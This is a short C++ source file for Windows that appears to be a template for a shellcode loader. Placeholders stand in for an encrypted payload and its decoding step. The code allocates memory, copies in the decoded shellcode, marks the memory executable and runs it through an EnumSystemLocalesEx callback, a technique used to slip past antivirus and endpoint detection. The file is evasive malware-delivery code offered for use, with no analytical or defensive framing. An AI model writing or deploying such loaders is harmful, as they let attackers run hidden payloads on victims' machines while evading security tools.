#include <windows.h>
#include "base64.h"
#include "syscall.h"


char Ciphertext[] = "<Ciphertext>";

int main() {
	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	memcpy(addr, &shellcode[0], sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	::EnumSystemLocalesEx((LOCALE_ENUMPROCEX)addr, LOCALE_ALL, NULL, NULL);
	return 0;

}